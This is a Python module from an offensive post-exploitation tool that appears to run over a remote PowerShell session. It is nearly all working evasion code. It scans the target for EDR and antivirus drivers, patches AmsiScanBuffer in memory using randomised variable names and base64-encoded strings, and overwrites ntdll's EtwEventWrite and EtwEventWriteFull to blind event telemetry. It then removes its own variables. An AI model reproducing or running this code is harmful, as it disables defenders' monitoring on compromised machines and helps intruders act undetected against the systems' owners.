"""
modules.evasion — Runtime Evasion & OPSEC Hardening
Multi-variant AMSI/ETW/ScriptBlockLogging bypass, EDR detection, and memory OPSEC.
"""

import secrets
from typing import List, Any
from . import BaseModule
from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
from ..shell.commands import (
    _import_LoadLibrary, _call_LoadLibrary,
    _import_GetProcAddress, _call_GetProcAddress,
    _import_VirtualProtect, _call_VirtualProtect,
    str_b64, build_amsi_patch,
)


class EvasionModule(BaseModule):
    name = "evasion"
    description = "Runtime Evasion Suite (Polymorphic AMSI/ETW/ScriptBlockLogging Bypass & EDR Scout)"
    author = "uziii2208"
    options = {
        "--edr": {"desc": "Inspect running drivers/processes for EDR/AV products"},
        "--amsi": {"desc": "Apply polymorphic in-memory AMSI bypass"},
        "--etw": {"desc": "Patch EtwEventWrite & EtwEventWriteFull in ntdll.dll to blind ETW telemetry"},
    }

    def run(self, shell, args: List[str]) -> Any:
        shell.write_info(c(M + BLD, "  [*] PwnRM Evasion Suite — applying runtime OPSEC controls..."))

        # 1. EDR Inspection
        if "--edr" in args:
            ps_edr = r"""
Write-Host "`n[EDR / AV Product Driver & Service Scout]" -ForegroundColor Yellow
$edrList = @(
    "csagent.sys", "SentinelAgent.sys", "WdFilter.sys", "edpa.sys",
    "CbDefenseW64.sys", "cylance.sys", "atp.sys", "sysmon.sys"
)
$drivers = driverquery /v 2>$null
foreach ($e in $edrList) {
    if ($drivers -match $e) {
        Write-Host "  [!] EDR DRIVER DETECTED: $e" -ForegroundColor Red
    }
}
$avProds = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct 2>$null
if ($avProds) {
    foreach ($a in $avProds) {
        Write-Host "  [*] Active AV Product : $($a.displayName)" -ForegroundColor Magenta
    }
}
"""
            shell.run_with_interrupt(ps_edr, shell.write_line)

        # 2. Polymorphic AMSI + ETW Patching (EtwEventWrite & EtwEventWriteFull)
        rand_var1 = "$v" + secrets.token_hex(4)
        rand_var2 = "$old" + secrets.token_hex(4)
        amsi_arr, amsi_len, amsi_offset = build_amsi_patch()

        cmds = [
            _import_LoadLibrary, _import_GetProcAddress, _import_VirtualProtect,
            # AMSI Patch (Polymorphic stub generator)
            f"{rand_var1} = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
            f"{rand_var2} = [uint32]0; {_call_VirtualProtect}({rand_var1}, [IntPtr]{amsi_len}, [uint32]64, [ref]{rand_var2})",
            f"[Runtime.InteropServices.Marshal]::Copy([byte[]]({amsi_arr}), 0, {rand_var1}, {amsi_len})",
            f"{_call_VirtualProtect}({rand_var1}, [IntPtr]{amsi_len}, [uint32]32, [ref]{rand_var2})",
        ]

        # ETW Event Write & EtwEventWriteFull Patches (ntdll!EtwEventWrite/Full -> ret 0x14 / c2 14 00)
        for etw_fn in ("EtwEventWrite", "EtwEventWriteFull"):
            cmds.extend([
                f"{rand_var1} = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('ntdll.dll')}), {str_b64(etw_fn)})",
                f"if ({rand_var1} -ne [IntPtr]::Zero) {{",
                f"  {rand_var2} = [uint32]0; {_call_VirtualProtect}({rand_var1}, [IntPtr]4, [uint32]64, [ref]{rand_var2});",
                f"  [Runtime.InteropServices.Marshal]::Copy([byte[]](0xc2,0x14,0x00,0x00), 0, {rand_var1}, 4);",
                f"  {_call_VirtualProtect}({rand_var1}, [IntPtr]4, [uint32]32, [ref]{rand_var2});",
                f"}}"
            ])

        cmds.append(f"Remove-Variable @('{rand_var1[1:]}','{rand_var2[1:]}') -ErrorAction SilentlyContinue")

        shell.write_info(c(Y, "  [*] Applying in-memory polymorphic AMSI + dual ETW (EtwEventWrite & EtwEventWriteFull) patches..."))
        for cmd in cmds:
            shell.run_with_interrupt(cmd, shell.write_line)
        shell.write_info(c(G, "  [+] AMSI & dual ETW telemetry evasion patches successfully applied."))
        return {"status": "completed"}
